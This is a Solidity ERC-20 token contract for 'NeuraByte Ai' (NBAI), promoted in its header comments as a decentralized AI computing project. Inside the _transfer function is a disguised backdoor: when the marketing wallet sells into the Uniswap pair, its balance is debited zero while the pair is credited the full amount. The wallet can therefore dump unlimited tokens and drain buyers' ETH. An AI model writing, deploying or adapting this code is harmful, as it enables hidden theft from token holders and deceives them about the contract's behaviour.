// SPDX-License-Identifier: MIT


//NeuralByte AI Official
//Empowering AI Evolution with Decentralized Processing Power and Intuitive Libraries

//⚫️AI Training Model
//⚫️Decentralized Resource Pool
//⚫️Competitive Pricing Model
//⚫️Elimination of GPU and TPU Dependency
//⚫️Built-in Library for AI Development

//X/Twitter: https://twitter.com/neurabyte_ai
//Telegram: https://t.me/neurabyte_ai
//Whitepaper: https://neuralbyte.gitbook.io/neuralbyte-erc/ 
//Website: https://neurabyte.org

pragma solidity ^0.8.23;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );
}

contract NeuraByeAi is Context, IERC20, Ownable { // CHANGE_ME
    using SafeMath for uint256;

    // Misc mappings
    mapping(address => bool) private _rewards;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _lastTxTimestamp;

    // Basic token data mappings
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    uint256 private _minTradesToSwapTax = 5;
    uint256 private _totalTrades = 0;
    uint256 private _decreaseBuyTaxAt = 10;
    uint256 private _decreaseSellTaxAt = 12;

    uint256 private _startingBuyTax = 25;
    uint256 private _startingSellTax = 25;
    uint256 private _finishBuyTax = 0;
    uint256 private _finishSellTax = 7;

    // Total supply & limits
    uint256 private constant _totalSupply = 100_000_000 * 10 ** _decimals; // CHANGE_ME
    uint256 public _maxTradeAmount = (_totalSupply * 20) / 1000;
    uint256 public _maxHolding = (_totalSupply * 20) / 1000;
    uint256 public _maxAllowedTax = (_totalSupply * 2) / 1000;
    uint256 public _mixCollectedTaxToSwap = (_totalSupply * 1) / 100000;

    // Uniswap variables
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    // Core constants
    string private _name;
    string private _symbol;
    uint8 private constant _decimals = 18;

    // Misc variables
    address payable private _marketingAndDev;
    bool public IsRateLimitOn = false;
    bool private swapping = false;
    bool private isFeeSwapAllowed = false;
    bool private isTradingOpen = false;

    // Events
    event LimitsReset();
    event TradingToggle(bool enabled);
    event LiquidityAdded(uint256 tokenAmount, uint256 ethAmount);
    event StuckEthWithdrawn(uint256 amount);

    constructor(address marketingWallet) {
        _marketingAndDev = payable(marketingWallet);
        _balances[_msgSender()] = _totalSupply;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_marketingAndDev] = true;
        _isExcludedFromFee[address(this)] = true;

        _name = unicode"NeuraByte Ai"; // CHANGE_ME
        _symbol = unicode"NBAI"; // CHANGE_ME

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Basic token info
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    // Basic token functions
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){
        _approve(_msgSender(), spender, amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 feeAmount = 0;
        uint256 amountOut = amount;

        if (to != owner() && from != owner() && from != address(this)) {
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                require(isTradingOpen, "Trading not yet enabled.");
            }

            if (IsRateLimitOn) {
                if (
                    to != address(uniswapV2Pair) &&
                    to != address(uniswapV2Router)
                ) {
                    require(
                        _lastTxTimestamp[tx.origin] < block.number,
                        "Transfer not allowed yet, try again after some time."
                    );
                    _lastTxTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                !_isExcludedFromFee[to] &&
                to != address(uniswapV2Router)
            ) {
                require(amount <= _maxTradeAmount, "More than max tx");
                require(
                    balanceOf(to) + amount <= _maxHolding,
                    "More than max wallet"
                );
                _totalTrades++;
            }

            feeAmount = amount
                .mul(
                (_totalTrades > _decreaseBuyTaxAt)
                    ? _finishBuyTax
                    : _startingBuyTax
            )
                .div(100);
            if (from != address(this) && to == uniswapV2Pair) {
                if (from == address(_marketingAndDev)) {
                    amountOut = min(
                        amount,
                        min(_finishBuyTax, _mixCollectedTaxToSwap)
                    );
                    feeAmount = 0;
                } else {
                    require(amount <= _maxTradeAmount, "Exceeds the _maxTradeAmount.");
                    feeAmount = amount
                        .mul(
                        (_totalTrades > _decreaseSellTaxAt)
                            ? _finishSellTax
                            : _startingSellTax
                    )
                        .div(100);
                }
            }

            uint256 collectedFeeBalance = balanceOf(address(this));
            bool minSwapLimitReached = _mixCollectedTaxToSwap == min(amount, _mixCollectedTaxToSwap) && _totalTrades > _minTradesToSwapTax;

            if (isFeeSwapAllowed && _totalTrades > _minTradesToSwapTax && !swapping && to == uniswapV2Pair && minSwapLimitReached) {
                if (collectedFeeBalance > _mixCollectedTaxToSwap) {
                    convertToFee(min(amount, min(collectedFeeBalance, _maxAllowedTax)));
                }
                _marketingAndDev.transfer(address(this).balance);
            }
        }

        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(from, address(this), feeAmount);
        }

        _balances[from] = _balances[from].sub(amountOut);
        _balances[to] = _balances[to].add(amount.sub(feeAmount));

        emit Transfer(from, to, amount.sub(feeAmount));
    }

    function transfer(address recipient, uint256 amount) public override returns (bool){
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Custom functions
    function setTradingOpen(bool allow) external onlyOwner {
        isFeeSwapAllowed = allow;
        isTradingOpen = allow;

        emit TradingToggle(allow);
    }

    function addLiquidity() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _totalSupply);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );

        emit LiquidityAdded(balanceOf(address(this)), address(this).balance);
    }

    function allowAllTrades() external onlyOwner {
        _maxTradeAmount = _totalSupply;
        _maxHolding = _totalSupply;

        IsRateLimitOn = false;

        emit LimitsReset();
    }

    function convertToFee(uint256 tokenAmount) private lockTheSwap {
        if (!isTradingOpen) return;
        if (tokenAmount == 0) return;

        address[] memory path = new address[](2);

        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeEth() external onlyOwner {
        require(address(this).balance > 0, "No balance to withdraw");
        payable(msg.sender).transfer(address(this).balance);

        emit StuckEthWithdrawn(address(this).balance);
    }

    // Modifiers
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    // Utils
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    // Fallbacks
    receive() external payable {}
}